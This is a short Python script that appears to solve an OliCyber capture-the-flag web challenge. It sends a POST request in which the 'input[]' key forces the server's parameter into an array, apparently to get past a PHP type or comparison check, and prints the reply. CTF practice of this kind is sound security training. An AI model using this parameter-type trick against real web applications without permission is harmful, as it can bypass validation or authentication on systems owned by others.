import requests
url = "http://soundofsilence.challs.olicyber.it"

r = requests.session()

data = {
    "input[]": b'aa'
}

answ = r.post(url, data=data)
print(answ.text)
